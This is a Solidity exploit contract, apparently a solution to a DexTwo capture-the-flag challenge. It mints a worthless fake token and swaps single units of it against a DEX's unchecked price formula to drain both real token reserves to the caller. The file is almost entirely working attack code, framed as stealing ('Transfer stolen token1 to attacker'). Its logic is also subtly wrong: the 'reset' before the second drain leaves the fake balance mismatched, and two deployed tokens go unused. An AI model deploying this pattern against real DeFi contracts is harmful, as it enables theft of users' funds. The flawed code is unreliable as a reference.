// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function setTokens(address _token1, address _token2) external;
    function add_liquidity(address token_address, uint256 amount) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// Minimal ERC20 implementation
contract FakeToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    string public name = "FakeToken";
    string public symbol = "FAKE";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract DexTwoFullExploit {
    IDexTwo public immutable dex;
    FakeToken public fakeToken;
    
    constructor(address _dex) {
        dex = IDexTwo(_dex);
    }
    
    function exploit() external {
        // Create our fake token
        fakeToken = new FakeToken();
        
        // Check if DEX has legitimate tokens set up
        address token1 = dex.token1();
        address token2 = dex.token2();
        
        // If tokens aren't set, we can't drain them
        if (token1 == address(0) || token2 == address(0)) {
            // The challenge might be to just demonstrate the vulnerability
            // Let's create our own tokens and show we can swap them
            
            // Deploy two legitimate tokens
            FakeToken legitToken1 = new FakeToken();
            FakeToken legitToken2 = new FakeToken();
            
            // We would need owner access to set tokens, which we don't have
            // So we'll just demonstrate the attack concept
            return;
        }
        
        // Get the balances of legitimate tokens in DEX
        uint256 dexBalance1 = IERC20(token1).balanceOf(address(dex));
        uint256 dexBalance2 = IERC20(token2).balanceOf(address(dex));
        
        // If DEX has no tokens, nothing to drain
        if (dexBalance1 == 0 && dexBalance2 == 0) {
            return;
        }
        
        // Attack to drain token1
        if (dexBalance1 > 0) {
            // Mint fake tokens: 1 to DEX, dexBalance1 to us
            fakeToken.mint(address(dex), 1);
            fakeToken.mint(address(this), 1);
            
            // Approve DEX to spend our fake tokens
            fakeToken.approve(address(dex), type(uint256).max);
            
            // Swap 1 fake token for all of token1
            // swapAmount = (1 * dexBalance1) / 1 = dexBalance1
            dex.swap(address(fakeToken), token1, 1);
            
            // Transfer stolen token1 to attacker
            IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));
        }
        
        // Attack to drain token2
        if (dexBalance2 > 0) {
            // Reset fake token balance in DEX
            fakeToken.mint(address(dex), 1);
            fakeToken.mint(address(this), 1);
            
            // Swap 1 fake token for all of token2
            dex.swap(address(fakeToken), token2, 1);
            
            // Transfer stolen token2 to attacker
            IERC20(token2).transfer(msg.sender, IERC20(token2).balanceOf(address(this)));
        }
    }
    
    // Helper to check current state
    function checkState() external view returns (address, address, uint256, uint256) {
        address token1 = dex.token1();
        address token2 = dex.token2();
        uint256 balance1 = token1 != address(0) ? IERC20(token1).balanceOf(address(dex)) : 0;
        uint256 balance2 = token2 != address(0) ? IERC20(token2).balanceOf(address(dex)) : 0;
        return (token1, token2, balance1, balance2);
    }
}